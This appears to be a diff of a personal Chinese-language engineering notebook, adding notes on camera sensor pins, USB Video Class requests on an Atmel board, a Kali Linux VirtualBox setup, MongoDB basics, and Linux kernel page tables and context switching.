@@ -4490,15 +4490,16 @@ soc_camera_host_register //
 RGB 格式直接显示的, 
 YCbCu 是编码的格式,使用于压缩MP4格式的文件
 ov7670 cmos芯片的针脚!
-	pclk: 像素输出时钟! 是由ov芯片输出的时钟 
-	D0-7: 图像并排数据针
+	pclk: 像素输出时钟! 是由ov芯片输出的时钟 	senor发出
+	D0-7: 图像并排数据针	senor发出
 	xclk: 提供ov芯片运行的时钟信号脚 典型是 24Mhz
 	scl: i2c时钟针
 	sda: i2c数据针
-	vsync: 帧起始信号
-	href: 行起始信号
+	vsync: 帧起始信号	senor发出
+	href: 行起始信号	senor发出
 	reset: 重置针 ,正常状态下高电平 低电平触发
 	pwdn: power down 针
+	Fsin: frame synchronize input 	帧同步未知实际作用,但实际可不接!!	senor接收!!!!
 就是说,除了 isi 和i2c 的接口外 还要自己定义 pwdn reset xclk针!!
 pwdn reset 两gpio功能针的配置,要另外使用dts 自己做一个pinctrl出来!!//可以参考 at91-sama5d4_xplaint.dts gpio_keys的做法
 xclk 输出时钟针的配置!! 		//xclk即 datasheet的 isi_mck 即 Programmable Clock output 1(PCK1)
@@ -4863,7 +4864,7 @@ gst-launch-1.0 v4l2src device="/dev/video0" ! video/x-raw,width=640,height=480 !
 在dts里 pclk 最难发现现要在哪里修改!!! 不知道怎么改, 一直保持在 28mhz 
 
 摄像像头采集窗口格式:
-#define CIF_WIDTH	352
+#define CIF_WIDTH	352	//10万像素
 #define CIF_HEIGHT	288
 
 #define QCIF_WIDTH	176
@@ -4875,22 +4876,22 @@ gst-launch-1.0 v4l2src device="/dev/video0" ! video/x-raw,width=640,height=480 !
 #define QQVGA_WIDTH	160
 #define QQVGA_HEIGHT	120
 
-#define QVGA_WIDTH	320
+#define QVGA_WIDTH	320	
 #define QVGA_HEIGHT	240
 
-#define SVGA_WIDTH	800
+#define SVGA_WIDTH	800	//50万像素
 #define SVGA_HEIGHT	600
 
-#define SXGA_WIDTH	1280
+#define SXGA_WIDTH	1280	//130万像素
 #define SXGA_HEIGHT	1024
 
-#define VGA_WIDTH	640
+#define VGA_WIDTH	640	//30万像素
 #define VGA_HEIGHT	480
 
 #define UXGA_WIDTH	1600
 #define UXGA_HEIGHT	1200
 
-#define XGA_WIDTH	1024
+#define XGA_WIDTH	1024	//80万像素
 #define XGA_HEIGHT	768
 上述说明的 cif qcif qqcif qqvga qvga vga svga uxga xga 是典型的窗口格式
 例如,cif窗口格式 典型是 352x288 分辨率的窗口!!!
@@ -8449,11 +8450,17 @@ apk安装:
 
 
 20170511
-virtualbox 安装 kaji linux
+virtualbox 安装 kali linux
+	 kali是集成众多hack工具的debian系统,最著名的工具有 metasploit
 virtualbox不能安装64位系统问题:
 	`进入BIOS后，找到Configuration选项，选择Intel Virtual Technology并回车
-kajilinux在 virtualbox 安装:http://blog.topspeedsnail.com/archives/1841
-kajiliunx加入拼音输入法:(卧槽,到最后都不知道是怎么成功的)
+kalilinux在 virtualbox 安装:http://blog.topspeedsnail.com/archives/1841
+	注意,安装时分配的硬盘尽可能大,比如大于20GB,不然安装出错!!
+	登陆界面:用户填root 
+	使用virtualbox 运行虚拟kali时,一定要分配动态硬盘,因为虚拟kali硬盘不够是可以扩容,扩容例子: (resize的单位是 MB!!)
+		kingders@kingders-ThinkPad-T420:~/VirtualBox VMs/kali$ VBoxManage modifyhd "NewVirtualDisk1.vdi" --resize 1024
+	注意:虚拟kali 使用的网络方式是 桥接方式,这样才可以让kali接到同一层局域网
+kaliliunx加入拼音输入法:(卧槽,到最后都不知道是怎么成功的)
 	语言输入两种框架 ibus, fcitx,按道理选择其中之一就好
 	安装:
 	apt-get install fcitx fcitx-googlepinyin
@@ -9371,7 +9378,7 @@ USBD_init()
 		reset UDPHS
 		打开PMC的usb模块工作时钟,usb模块开始工作
 		进一步初始化每个endpoint 的 DMA
-		强制设定 usb2.0 (fullspeed)模式
+		设定 usb normal (根据实际 转换 fullspeed 12mbs 或者 hight-speed 480mhz )模式,不要被开头说明force fullspeed迷惑!!!!!
 		配置 usb 的 wakeup endofrsm det_suspd 中断 
 		关闭PMC的usb模块工作时钟,usb模块暂停工作
 	USBDCallbacks_Initialized() 配置中断函数,并打开中断
@@ -9399,12 +9406,14 @@ VBus_Configure配置vbus针的中断处理函数,
 	VIDD_GetCUR 是pc提出获取当前CUR的请求,对应地,开发板通过 usb_write 回送对应的信息
 	VIDD_SetCUR 是pc提出设置开发CUR的请求,对应地,开发板通过 usb_read 向pc获取具体设置内容,
 		    然后在下一次接收到pc传来的数据后,执行VIDD_StatusStage,进行具体设置
+
 	VIDD_GetDEF 是pc提出获取DEF的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
 	VIDD_GetINFO 是pc提出获取INFO的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
 	VIDD_GetMIN 是pc提出获取MIN的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
 	VIDD_GetMAX 是pc提出获取MAX的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
 	VIDD_GetRES 是pc提出获取RES的请求,然而开发板无视请求,这种情况下pc端会一直等待,直到请求超时
 	怪不得,usb配置这一块浪费这么多时间,原来是因为一些请求超时!!
+	比起无视请求,或者可以选择接着发一个USBD_Write(0,0,0,0),来结束这次请求通讯!!(未测试!!)
 
 usb摄像头打开摄像头时,dbug输出的log:
 	-- SAM9XX5-EK
@@ -9425,10 +9434,12 @@ usb摄像头打开摄像头时,dbug输出的log:
 	
 	Vid SetCUR(26) VS PROBE 
 	Vid GetCUR(26) VS PROBE 
-	Vid SetCUR(26) VS COMMIT -W- UDP_Stall: EP0 locked
+	Vid SetCUR(26) VS COMMIT -W- UDP_Stall: EP0 locked 	//锁住了endpoint0, 也就说不能在做设置!!
 	
 	vidS
 	FR USB:  53; ISI:  16
+	
+	//经历了getcur setcur 等等枚举过程后,最后setcur 上的commit协商结果,然后就setinterface 然后开始同步传输 
 	
 320x240修改成640x480 模式 需要改frmW frmH,
 在定义frmW frmH 定义的位置赋值 640,480 并不起作用,原因是后续会更改此数值!!! 
@@ -9455,6 +9466,70 @@ usb摄像头打开摄像头时,dbug输出的log:
 		否则会留在旧图片地址处,
 	然而VIDD_PayloadSent() 源源不断地发送图片流数据,它并不关心传输的图片数据是旧的还是新的.
 
+
+先处理中断处理程序!!!
+	USBDDriverCallbacks_InterfacesettingChanged() 处理 bVideoON 标记
+	USBDDriver.c -> setInterface() 调用 USBDDriverCallbacks_InterfacesettingChanged()
+	USBDDriver.c -> USBDDriver_RequestHandler() 调用 setInterface()
+	usb_video_isi.c -> USBDCallbacks_RequestReceived() 调用 USBDDriver_RequestHandler()
+	core.c -> USBD_RequestHandler() 调用 USBDCallbacks_RequestReceived() 
+		USBDCallbacks_RequestReceived() 也 处理 GET_CUR SET_CUR 相关的请求!!!!!
+	USBD_HAL.c -> UDPHS_EndpointHandler 调用 USBD_RequestHandler()
+		UDPHS_EndpointHandler 是大boss,所有接收到的usb数据包都会触发这个中断函数,主要有4个内容:
+		IN packet sent: 发出去的内容,得到了回复.
+		out packt received: 得到host端传来的数据包!!!
+		stall sent : 关闭端点的请求发出后,返回的回复!!
+		setup packet received: 收到设置包内容,就是典型的 0端口,发来的各种设置请求!!!
+		
+	
+关于CUR内容!!
+	viedo 的 CUR内容是指此刻的 数据流 设定内容 !!!!分两种,
+	一种是probe,即枚举设定: 就是详细的设置内容: _USBVideoProbeCommiData,例如!!
+		/** Probe & Commit Controls */
+		static USBVideoProbeData viddProbeData =
+		{
+		    0, /* bmHint: All parameters fixed: sent by host */
+		    0x01,   /* bFormatIndex: Format #1 */
+		    //0x01,   /* bFrameIndex: Frame #1 */
+		    //by william
+		    0x2,   /* bFrameIndex: Frame #1 */
+		    FRAME_INTERVALC(4), /* dwFrameInterval: in 100ns */
+		    0, /* wKeyFrameRate: not used */
+		    0, /* wPFrameRate: not used */
+		    10000, /* wCompQuality: highest */
+		    0, /* wCompWindowSize: ?K */
+		    100, /* wDelay: Internal VS latency in ms */
+		    FRAME_BUFFER_SIZEC(800, 600), /* dwMaxVideoFrameSize: in bytes */
+		    640//FRAME_PACKET_SIZE_HS /* dwMaxPayloadTransferSize: in bytes */
+		};
+	另一种是commit,可以理解为 视频流接口的设定!!,
+		可以有多个视频流接口,一般指对应多个摄像头,每个视频流都有自己的setting,
+		不过这个setting只是一个 8位数据, 并不知道是什么类型的 setting 内容
+		
+	GET_CUR 是往pc USBD_Write()数据 例如:
+		USBD_Write(0, &viddProbeData, len, 0, 0);(端口,地址,长度,callback函数,callback函数参数)
+		往0端口写入 放在&viddProbeData地址且长度为len的内容 
+		然后由于callback函数和函数参数为零,使用write后,不执行callback函数!!
+	SET_CUR 是从pc USBD_Read()入数据 例如:
+		USBD_Read(0, pControlBuffer, len, (TransferCallback)VIDD_StatusStage, 0);(端口,地址,长度,callback函数,callback函数参数)
+		从0端口读入长度为len的数据, 放入 pControlBuffer地址, 读后执行VIDD_StatusStage函数!!!
+	 	VIDD_StatusStage函数最后会 USBD_Write(0,0,0,0)结束 当下这阶段的通讯
+		注意!!
+		SET_CUR 设置了 commit 类 参数时,禁止了 endpoint0 的工作!!!
+	总的说,9g25只是响应了 CUR 的请求!!,其他请求都无视掉!!!
+	关于 cur 有许多误解,在后面的 UVC 笔记中解决
+
+关于isi 的 USBDCallbacks_RequestReceived()
+	处理处理 GET_CUR SET_CUR 的这些 videorequest 分支外,
+	还有 STD request 这分支:而这分支估计就是做 然而似乎并不是实现一个,多个uvc标准命令的地方!!!
+	STD request:包括 
+		获取 usb各种内容描述结构符,在usb插入后枚举阶段的工作
+		设置 usb设备地址
+		获取/设置 configuration 在usb插入后枚举阶段的工作
+			usb插入枚举过程中可能选着其中一个configure: configurationDescriptorsHS和configurationdescriptorsFS
+		获取/设置 设备/端点 的status
+		设置/清除 远程wakeup/端点关闭与否 的特征feature
+		获取/设置 接口interface (在这里的接口指的是 视频流输出的接口)
 sp2519补充:
 	有三个电源针!! 
 		AVDD 2.8v 片内模拟电路供电
@@ -9463,13 +9538,11 @@ sp2519补充:
 			I/O电路就是使用I/O针与其他芯片进行通讯,I/O使用的逻辑电平与供电值有关!!
 			如果I/O逻辑1是3.3V,哪么要求控制电路电源是3.3V
 			(sp2519的摄像头逻辑电平是3.3V的,所对应的这边的I/O电路也需要3.3v的电压)
-
 开漏电路拓展:
 	开漏电路概念中提到的“漏”就是指MOSFET的漏极。
 	同理，开集电路中的“集”就是指三极管的集电极。
 	开漏电路就是指以MOSFET的漏极为输出的电路。
 	一般的用法是会在漏极外部的电路添加上拉电阻。完整的开漏电路应该由开漏器件和开漏上拉电阻组成
-	
 
 
 
@@ -9544,6 +9617,9 @@ cmos sensor 的 ISP(in sensor process)(片上执行模块) 有:
 	BPC: bad pixel correction 坏像数点矫正
 	DVP: 就是传统的 图像并口数据传输协议
 	MIPI: 超高速的 图像串口数据传输协议
+	iris: 光圈!!曝光栅孔
+	zoom: 缩放
+	pantilt: PAN&TILT两维数控转台是一种能够同时绕铅垂轴和水平轴旋转的机械工作台，简称PT转台
 
 RAW:格式!!也是cmos的采集格式!!!注意,与RGB有天大的差异!!!
 	RAW格式是,每个像数点pixel只采集RGB三色中其中一种颜色!!!!
@@ -11634,12 +11710,61 @@ html5 学习:
 	并没有太难的!!!
 	主要是video 和数据库的接口重点看看
 MangoDB(分布式文件存储的数据库,有别与Mysql):
-	
-	
-		
+	manggo 的shell 命令操作是符合javascript语言标准
+	而Mysql的shell 命令操作是基于 一整套sql语法!!
+	mangoDB 的每条数据条格式与 json相似 例如:
+		{"site":"www.baidu.com"}
+		{"site":"www.google.com","name":"Google"}
+		{"site":"www.runoob.com","name":"菜鸟教程","num":5}
+	与sql比较!!!
+		SQL术语/概念 	MongoDB术语/概念 	解释/说明
+		database 	database 	数据库
+		table 	collection 	数据库表/集合
+		row 	document 	数据记录行/文档
+		column 	field 	数据字段/域
+		index 	index 	索引
+		table joins 	  	表连接,MongoDB不支持
+		primary key 	primary key 	主键,MongoDB自动将_id字段设置为主键
+	Capped collections 就是固定大小的collection	
+	在MongoDB数据库中名字空间 <dbname>.system.* 是包含多种系统信息的特殊集合(Collection)，如下:
+		集合命名空间		 	描述
+		dbname.system.namespaces 	列出所有名字空间。
+		dbname.system.indexes 		列出所有索引。
+		dbname.system.profile 		包含数据库概要(profile)信息。
+		dbname.system.users 		列出所有可访问数据库的用户。
+		dbname.local.sources 		包含复制对端（slave）的服务器信息和状态。		
+	MongoDB 数据类型
+		数据类型 	描述
+		String		字符串。存储数据常用的数据类型。在 MongoDB 中，UTF-8 编码的字符串才是合法的。
+		Integer		整型数值。用于存储数值。根据你所采用的服务器，可分为 32 位或 64 位。
+		Boolean		布尔值。用于存储布尔值（真/假）。
+		Double		双精度浮点值。用于存储浮点值。
+		Min/Max keys	将一个值与 BSON（二进制的 JSON）元素的最低值和最高值相对比。
+		Arrays		用于将数组或列表或多个值存储为一个键。
+		Timestamp	时间戳。记录文档修改或添加的具体时间。
+		Object		用于内嵌文档。
+		Null		用于创建空值。
+		Symbol		符号。该数据类型基本上等同于字符串类型，但不同的是，它一般用于采用特殊符号类型的语言。
+		Date		日期时间。用 UNIX 时间格式来存储当前日期或时间。你可以指定自己的日期时间：创建 Date 对象，传入年月日信息。
+		Object ID	对象 ID。用于创建文档的 ID。
+		Binary Data	二进制数据。用于存储二进制数据。
+		Code		代码类型。用于在文档中存储 JavaScript 代码。
+		Regular expression	正则表达式类型。用于存储正则表达式。
+	启动mangoDB服务:
+		mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]
+			mongodb:// 这是固定的格式，必须要指定。
+			username:password@ 可选项，如果设置，在连接数据库服务器之后，驱动都会尝试登陆这个数据库
+			host1 必须的指定至少一个host, host1 是这个URI唯一要填写的。
+使用用户名fred，密码foobar登录localhost的baz数据库。
 
-
-
+mongodb://fred:foobar@localhost/baz				它指定了要连接服务器的地址。如果要连接复制集，请指定多个主机地址。
+			portX 可选的指定端口，如果不填，默认为27017
+			/database 如果指定username:password@，连接并验证登陆指定数据库。若不指定，默认打开 test 数据库。
+			?options 是连接选项。如果不使用/database，则前面需要加上/。
+				所有连接选项都是键值对name=value，键值对之间通过&或;（分号）隔开 
+		例子:
+			使用用户名fred，密码foobar登录localhost的baz数据库。
+			mongodb://fred:foobar@localhost/baz
 
 
 
@@ -11891,6 +12016,1180 @@ Linux 关机
 	
 
 
+
+
+
+
+
+20170726
+uvc 枚举过程分析:
+	http://bbs.eeworld.com.cn/thread-474097-1-1.html
+
+uvc详细学习分析:	
+	CONTROL SELECTOR (cs)
+
+	camera terminal (CT) :  修改控制 video stream 特征 终端 就是说是uvc 标准命令终端
+		例如 zoom iris AE roll 等控制
+	input terminal (IT) : 原始流数据进入 视频编码器 端口 : 这里说的是,设备本身就存有的视频流,等
+	output terminal (OT) : 视频编码器 输出数据流 的端口 : 这里说的是,数据从device端的视频编码器流出,进入host IN端
+		一般来说,我们的 UVC 只用 OT 端, 而不会使用 IT端!!!,
+		因为源数据从摄像头流入视频编码器,再通过usb传上pc
+		而不是源数据从pc通过usb 流入设备的视频编码器,
+	selector unit (SU): 多路输入流 经SU 选择其中一路,输出
+	Processin unit (PU): 和 CT 相似,也是处理 uvc 标准命令的!!!
+	Encoding unit (EU): 编码单元!!!
+	Extension unit (XU): 延伸unit ,额外的控制单元供厂商使用 
+	uvc拓扑结构例子分析:
+		1,
+		sensor -> CT(unit ID 2) ----------------|
+				  	   		|--> su(unit ID 3) -> pu(unit ID 4) -> OT(unit ID 5) ->PC
+		composite_from_device -> IT(unit ID 1) -|
+		一般uvc系统由多个模块联接而成, 
+		CT(camera terminal):从sensor引入数据流,而IT(input terminal)从其他渠道引入的数据流,IT,CT的功能是差不多的	
+		SU(selector unit):就是从众多输入单元,诸如 CT IT中选择其中一个,供给后续处理
+		PU(processing unit):数据流进一步处理的单元
+		OT(output terminal):输出单元,就是往usb总线输出流数据的单元!!!
+		上述模块都有一个unit ID,这些ID是人为设定的而不是协议规定地,ID都设在各自的 descriptor 里, 
+			usb插入枚举时,会上传到pc上!!!,unitID非常重要, 
+		#define CT_CONTROL_UNDEFINED                0x00
+		#define CT_SCANNING_MODE_CONTROL            0x01
+		#define CT_AE_MODE_CONTROL                  0x02
+		#define CT_AE_PRIORITY_CONTROL              0x03
+		#define CT_EXPOSURE_TIME_ABSOLUTE_CONTROL   0x04
+		#define CT_EXPOSURE_TIME_RELATIVE_CONTROL   0x05
+		#define CT_FOCUS_ABSOLUTE_CONTROL           0x06
+		#define CT_FOCUS_RELATIVE_CONTROL           0x07
+		#define CT_FOCUS_AUTO_CONTROL               0x08
+		#define CT_IRIS_ABSOLUTE_CONTROL            0x09
+		#define CT_IRIS_RELATIVE_CONTROL            0x0A
+		#define CT_ZOOM_ABSOLUTE_CONTROL            0x0B
+		#define CT_ZOOM_RELATIVE_CONTROL            0x0C
+		#define CT_PANTILT_ABSOLUTE_CONTROL         0x0D
+		#define CT_PANTILT_RELATIVE_CONTROL         0x0E
+		#define CT_ROLL_ABSOLUTE_CONTROL            0x0F
+		#define CT_ROLL_RELATIVE_CONTROL            0x10
+		#define CT_PRIVACY_CONTROL                  0x11
+		上述是对 CT单元操作的一些标准指令集,实际操作例子:
+		給sensor传递一个缩放动作的请求, 我们的usb如此递交这样的申请
+			bmRequestType	0x21		D7: 0 = Host to device
+							D6..5: 01 = Class request
+							D4..0: 00001 = Recipient is interface	
+			bRequest	0x01		SET_CUR
+			wValue		0x0B00		CT_ZOOM_ABSOLUTE_CONTROL
+			wIndex		0x0200		CT(unit ID 2) -> 0x02, VideoControl interface ID 0 -> 0x00
+			wLength		0x0002		datasize 2 bytes
+			data		0xc4 0x56	data	
+		特别注意wIndex ,这里填的ID 是 descriptors 设定好的id, 
+			如果 CT(unit ID 7),VideoControl interface ID 6	则变为0x0706
+			如果 CT(unit ID 2),VideoControl interface ID 0  而wIndex是0x0500,
+			由于 unit ID 5 不是 CT模块, 而是 PU模块 
+			所以 wValue = 0x0B00,并不是指代CT_ZOOM_ABSOLUTE_CONTROL指令,
+			而是 PU_WHITE_BALANCE_TEMPERATURE_AUTO_CONTROL
+			分配 unit ID 号时,不能分配 0号ID, 因为unit ID 0 号在UVC上有固定用途!!
+		2,
+		sensor -> CT -> PU ------------> OT -> (USB IN Endpoint 1,video streaming interface 1)
+				    |-> EU ----> OT -> (USB IN Endpoint 2,video streaming interface 2)
+				    |-> EU ----> OT -> (USB IN Endpoint 3,video streaming interface 3)
+				    .....
+		EU (extend unit): 延伸模块,就是用户自定义处理模块!!!!!!
+渐渐地 UVC 有点眉目了!!
+	首先 一个 usb请求 分 bmRequestType bRequest wValue wIndex wLength Data
+		bmRequestType :标识是 UVC 
+		bRequest : setcur getcur getmax setmax ........
+		wValue : control selector 
+		wIndex : 0(控制端口) 和其他端口
+		wLength : Data 数据 size
+		Data: 数据!!!
+	然而wValue wValue 是关键, wValue可以是CT_ , VS_ ,PU_ ,,,, 很多都重码,不知道什么时候是CT_操作,什么时候是PU_操作,,,,,(已解决)
+UVC启动枚举分析:
+	1,
+	bmRequestType	0xA1		D7: 1 = Device To host
+					D6..5: 01 = Class request
+					D4..0: 00001 = Recipient is interface	
+	bRequest	0x01		SET_CUR
+	wValue		0x0100		VS_PROBE_CONTROl
+	wIndex		0x0001		unit ID 0 -> 0x00, Videostreaming interface ID 1 -> 0x01
+	wLength		0x001A		datasize 26 bytes
+	然后收到请求后 device 返回
+	
+
+sam4s16c-ek 的iar demo问题:
+	关于 core_cmd4.h 找不到: c++ include路径添加同项目的 CMSIS/Include
+	关于 __get_PSR() 找不到: 检查,项目对应的target 有没有选对cpu !!!!
+	卧槽,ek板子的demo程序是只能 放在 SRAM上, reset, 会跳到 sram 上运行!!!!,怎么烧到flash上运行?
+		解决: 项目的options-linker-config 下更换linker文件为 flash.icf,而非sram.icf
+		这下,可以通过samba 烧到 flash 里运行了  	
+补充:
+natation 原子操作!!
+
+
+
+
+
+
+
+
+
+
+20170802
+linux内核态, 用户态, MMU, page-table 管理 等等关于内存分配管理的内容 补充学习!!!
+首先分析内核启动中的内存内容
+start_kernel()
+    ->setup_arch()
+        ->内存设置代码
+          meminfo结构表明内存情况，是对物理内存结构meminfo的默认初始化。
+          nr_banks指定内存块的数量，bank指定每块内存的范围，
+          PHYS _OFFSET指定某块内存块的开始地址，MEM_SIZE指定某块内存块长度。
+          PHYS _OFFSET和MEM_SIZE都定义在include/asm-armnommu/arch-XXX/memory.h文件中，
+          其中 PHYS _OFFSET是内存的开始地址，MEM_SIZE就是内存的结束地址。
+          if (meminfo.nr_banks == 0) 
+          { 
+              meminfo.nr_banks = 1; 
+              meminfo.bank[0].start = PHYS_OFFSET; 
+              meminfo.bank[0].size = MEM_SIZE; 
+          }
+        ->内核内存空间管理
+          每一个任务都有一个mm_struct结构管理其内存空间，init_mm 是内核的mm_struct。
+          其中设置成员变量* mmap指向自己， 意味着内核只有一个内存管理结构，
+          设置 pgd=swapper_pg_dir，swapper_pg_dir是内核的页目录，ARM体系结构的内核页目录大小定义为16k。
+          init_mm定义了整个内核的内存空间，内核线程属于内核代码，同样使用内核空间，其访问内存空间的权限与内核一样。
+          init_mm.start_code = (unsigned long) &_text; 内核代码段开始 
+          init_mm.end_code = (unsigned long) &_etext; 内核代码段结束 
+          init_mm.end_data = (unsigned long) &_edata; 内核数据段开始 
+          init_mm.brk = (unsigned long) &_end; 内核数据段结束 
+        ->内存结构初始化
+          bootmem_init(&meminfo)函数根据meminfo进行内存结构初始化。
+          bootmem_init(&meminfo)函数中调用reserve_node_zero(bootmap_pfn, bootmap_pages) 函数，
+	  这个函数的作用是保留一部分内存使之不能被动态分配。
+	  这些内存块包括：
+          reserve_bootmem_node(pgdat, __pa(&_stext), &_end - &_stext); /*内核所占用地址空间*/ 
+          reserve_bootmem_node(pgdat, bootmap_pfn<<PAGE_SHIFT, bootmap_pages<<PAGE_SHIFT) /*bootmem结构所占用地址空间*/
+        ->创建内核页表 paging_init(&meminfo, mdesc) 
+          只映射所有部分物理内存供内核进程使用
+          这张内核页表是给硬件单元MMU使用的,
+	  至于要使用一级页表还是多级页表映射是!!是硬件MMU决定的,例如9g25这个arm架构的MMU是执行二级页表映射的!!
+          因为虚拟地址转物理地址是由硬件实现的!!所以kernal只是提供建立了的页表,地址转换还是由mmu来完成!!
+	  由于打开了mmu后cpu只访问虚拟地址,所以所以物理地址都需要映射到虚拟地址后才可以使用,
+          由于mpu各功能寄存器是物理地址的一部分,所以cpu访问这些地址时,也要通过往虚拟地址映射
+          然而内核页表一般映射的是部分ddram物理内存地址,并不包含功能寄存器地址
+          关于功能寄存器的访问后述
+		    
+Linux 简化了分段机制，使得虚拟地址与线性地址总是一致，因此，Linux的虚拟地址空间也为0～4G。
+	Linux内核将这4G字节的空间分为两部分。将最高的 1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为“内核空间”。
+	而将较低的3G字节（从虚拟地址 0x00000000到0xBFFFFFFF），供各个进程使用，称为“用户空间）。
+	因为每个进程可以通过系统调用进入内核，因此，Linux内核由系统 内的所有进程共享。
+	于是，从具体进程的角度来看，每个进程可以拥有4G字节的虚拟空间。
+linux每个用户进程都有自己单独的页表,内核线程使用内核的页表!! 每个用户进程要转到内核态时,内核态的代码都是使用这同一个内核页表
+	所以进程切换时,也要执行页表切换!!!
+	内核页表地址存放在 swapper_pg_dir ,每个用户态进程创建的时候,都会将这个页表复制到自己进程的页表中,成为自己页表的一部分
+	1g的内核虚拟内存空间里,有128mb空间 是高端内存,具体说,这个空间可以被操作临时映射所有的物理内存地址,即可以访问所有的物理地址 
+打开与不打开MMU的区别:
+	未打开前,cpu访问的是实际地址,打开以后,cpu访问的只有虚拟地址
+mmu 与 硬件寄存器访问关系
+	打开mmu以后,cpu访问的只有虚拟地址,mpu的硬件寄存器也需要要设置到页表上,即要把物理地址映射到物理地址上,才能被访问
+	一块mpu的全局地址空间除了给各个硬件分配的寄存器,还完全容纳了ddram的所有地址空间
+	开启了MMU后,所有全局地址都要经过映射才能被正确访问,即ddram地址和其他硬件寄存器地址都需要映射
+	keinel初始化构建内核态页表时,映射的所谓1gb内核态空间指的仅仅是ddram物理内存,并未建立对硬件寄存器的映射
+	硬件寄存器的映射是在具体驱动初始化时,修改内核态页表部分内容,即分配部分虚拟地址映射到硬件寄存器地址上
+	一般内核访问寄存器操作顺序是
+		 request_mem_region 申请-> ioremap 建立映射-> 寄存器操作 
+		-> iounmap 解除映射-> release_mem_region 释放申请。
+		本质就是修改内核页表,使一部分虚拟地址映射到功能寄存器上
+		一般来说，申请和释放操作分别放在open和release函数内比较好
+从linux的进程切换深入理解mmu 与 页表 
+	上下文概念:
+		操作系统管理很多进程的执行. 有些进程是来自各种程序、系统和应用程序的单独进程，而某些进程来自被分解为很多进程的应用或程序。
+		当一个进程从内核中移出，另一个进程成为活动的, 这些进程之间便发生了上下文切换. 
+		操作系统必须记录重启进程和启动新进程使之活动所需要的所有信息. 这些信息被称作上下文, 它描述了进程的现有状态, 
+		进程上下文是进程执行活动全过程的静态描述, 
+		当一个进程在执行时,CPU的所有寄存器中的值、进程的状态以及堆栈中的内容被称 为该进程的上下文。
+		当内核需要切换到另一个进程时，它需要保存当前进程的 所有状态，即保存当前进程的上下文，
+		以便在再次执行该进程时，能够必得到切换时的状态执行下去。
+		在LINUX中，当前进程上下文均保存在进程的任务数据结构中。在发生中断时,内核就在被中断进程的上下文中，在内核态下执行中断服务例程。
+		但同时会保留所有需要用到的资源，以便中继服务结束时能恢复被中断进程 的执行.
+		进程的上下文信息包括:
+			指向可执行文件的指针, 栈, 内存(数据段和堆), 进程状态, 优先级, 
+			程序I/O的状态, 授予权限, 调度信息, 审计信息, 有关资源的信息(文件描述符和读/写指针), 
+			有关事件和信号的信息, 寄存器组(栈指针, 指令计数器)等等, 诸如此类.
+	用户进程:
+		每个用户进程都已一张自己独有的内存页表,
+		每个用户进程都有 用户态进程部分 和 内核态进程部分,
+		所以每张用户进程页表都有两部分: 用户态页表部分 和 内核态页表部分, 相当于每个用户进程是拥有"4g内存"空间的
+		其中 所有用户进程页表的 内核态页表部分 都是一模一样!!
+		某时刻,进程要正在执行时,这张页表所在的物理地址是放在cp15寄存器的cr3里的,给MMU硬件模块使用
+		当执行的是内核态进程而不是用户态进程时,使用的内核页表是一般是 最近一次的 用户进程页表的 内核态页表部分
+		由于所有用户进程页表的 内核态页表部分 是一样的,所以其实内核态进程 使用的是指同一张内核页表
+		对同一用户进程,用户态和内核态理解:
+			内核态的进程访问处于内核数据段的栈，这个栈不同于用户态的进程所用的栈。
+			用户态进程所用的栈，是在进程线性地址空间中；
+			而内核栈是当进程从用户空间进入内核空间时，特权级发生变化，需要切换堆栈，那么内核空间中使用的就是这个内核栈。
+			因为内核控制路径使用很少的栈空间，所以只需要几千个字节的内核态堆栈。
+	内核进程:
+		一般是某些系统管理进程
+		只有 内核态进程部分
+		使用的 内核页表 与 用户进程内核态页表部分 是一样的,
+		所以,不管是 用户进程的内核态进程部分 还是 内核进程, 都使用同一个内核页表!!
+		所以切换到内核进程时并不会执行换页表操作,因为内核进程只会访问页表的内核态页表部分!!!
+	进程切换,
+		切换的是用户进程 与 用户进程, 用户进程的页表直接换过来
+		当 用户进程 换成 内核进程时,不用换页表,内核进程直接使用用户进程的 内核态页表部分
+		当 内核进程 换成 内核进程时,不用换页表,内核进程沿用最近一次的用户进程的 内核态页表部分
+		因为不管是 用户进程的内核态进程部分 还是 内核进程, 都使用同一个内核页表!!,所以根本就就不用换
+	context_switch进程上下文切换
+		context_switch 是进程调度的核心
+		用户进程A执行时,当遇到中断等各手段通知执行进程切换的时候,会转向保存用户态进程的各种信息,
+			然后转向 用户进程A的内核态进程部分,然后就在此执行context_switch 切换到其他进程!!!
+		内核进程B执行时,当遇到中断等各手段通知执行进程切换的时候,会转向执行context_switch 切换到其他进程!!!
+		注意要认为 context_switch只在 内核进程执行,也可以在 用户进程的内核态进程部分执行!!!!
+		prepare_arch_switch切换前的准备工作
+			在进程切换之前, 首先执行调用每个体系结构都必须定义的prepare_task_switch挂钩, 
+			这使得内核执行特定于体系结构的代码, 为切换做事先准备. 
+			大多数支持的体系结构都不需要该选项
+		换页表:
+			struct task_struct *next->mm		//新进程内存描述符(内存描述符包含进程页表信息)
+			struct task_struct *next->active_mm	//新进程活动的内存描述符(内存描述符包含进程页表信息)
+			struct task_struct *prev->mm		//旧进程内存描述符
+			struct task_struct *prev->active_mm	//旧进程活动的内存描述符(内存描述符包含进程页表信息)
+			用户进程->active_mm 是自己的内存描述符	(active_mm)是用来做标记用的!!!
+			内核进程->active_mm 是变化的
+			用户进程->mm 是自己的内存描述符
+			内核进程->mm 是mull值
+			用户进程 换成 内核进程, 内核进程 换成 内核进程时:
+				由于内核进程使用最近用户进程页表的内核态页表部分,但是注意:
+				所以实际并没有换页表的实际操作
+				prev是用户进程,next是内核进程,那么next会用prev的 active_mm,即next用prev页表的内核态页表部分
+				prev是内核进程,next是内核进程,那么next会用prev的 active_mm,即next用最近一次用户进程页表的内核态页表部分
+					而prev的 active_mm 最后要变回null
+			用户进程 换成 用户进程, 内核进程 换成 内核用户进程时:
+				switch_mm(prev->active_mm, next->mm, next);
+				道中涉及换页表的实际操作!!就是把页表的物理地址放到cp15
+				load_cr3(next->mm->pgd);	//换页表到cp15 的 cr3
+				load_mm_ldt(next->mm);		//应该是换到了next进程那保存了用户态进程部分各种信息的数据结构体
+				注意pgd不是GDT!! (GDT IDT LDT)的概念后面分清楚!!!
+			虽然换页表了,但是进程还没有被切换,但是由于还是在内核态工作,内核页表一样,所以能继续正常工作!!!
